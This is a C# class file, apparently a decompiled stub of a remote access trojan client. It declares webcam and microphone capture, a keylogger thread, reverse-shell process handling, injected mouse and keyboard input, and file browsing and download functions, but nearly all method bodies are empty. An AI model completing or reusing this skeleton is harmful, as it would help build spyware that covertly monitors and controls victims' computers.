using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;

namespace Stub;

public class Messages
{
	private delegate void AppendOutputTextDelegate(string text);

	private static readonly object SPL;

	[AccessedThroughProperty("MyProcess")]
	private static Process _MyProcess;

	private static int processid;

	public static byte[] WCam;

	public static byte[] WMic;

	public static byte[] WSound;

	public static int ngrok;

	public static int RS;

	public static Thread KL;

	public static IntPtr Handle;

	public static int Net3;

	static Messages()
	{
		Class0.smethod_13();
		SPL = RuntimeHelpers.GetObjectValue(ClientSocket.SPL);
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	private static void smethod_0(Process process_0)
	{
	}

	public static void AppendOutputText(string string_0)
	{
	}

	private static void MyProcess_ErrorDataReceived(object sender, DataReceivedEventArgs e)
	{
	}

	private static void MyProcess_OutputDataReceived(object sender, DataReceivedEventArgs e)
	{
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void Read(byte[] byte_0)
	{
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void mouse_event(int int_0, int int_1, int int_2, int int_3, int int_4);

	[DllImport("user32.dll")]
	internal static extern bool keybd_event(byte byte_0, byte byte_1, uint uint_0, UIntPtr uintptr_0);

	[DllImport("avicap32.dll")]
	public static extern IntPtr capCreateCaptureWindowA(string string_0, int int_0, int int_1, int int_2, int int_3, int int_4, int int_5, int int_6);

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short short_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1, int int_1);

	public static bool Cam()
	{
		return true;
	}

	public static string getFolders(object object_0)
	{
		return null;
	}

	public static string getFiles(object object_0)
	{
		return null;
	}

	public static string getDrives()
	{
		return null;
	}

	private static void Download(string string_0, string string_1)
	{
	}
}
